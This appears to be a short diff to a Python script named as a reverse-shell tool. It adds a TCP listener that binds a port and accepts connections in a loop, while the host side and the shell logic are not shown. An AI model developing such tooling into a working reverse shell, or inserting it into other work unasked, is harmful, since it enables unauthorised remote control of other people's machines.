@@ -1,4 +1,5 @@
 import argparse
+import socket
 
 
 class reverse_shell:
@@ -37,7 +38,10 @@ class reverse_shell:
     def listener(self):
         """Runs main loop for listener, listens for beacons from host
         """
-        pass
+        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.socket.bind(('', self.parser.lport))
+        while True:
+            c, addr = self.socket.accept()
 
     def main(self):
         """Runs main loop for reverse_shell
@@ -46,6 +50,7 @@ class reverse_shell:
             self.listener()
         else:
             self.host()
+
 
 if __name__ == '__main__':
     reverse_shell()
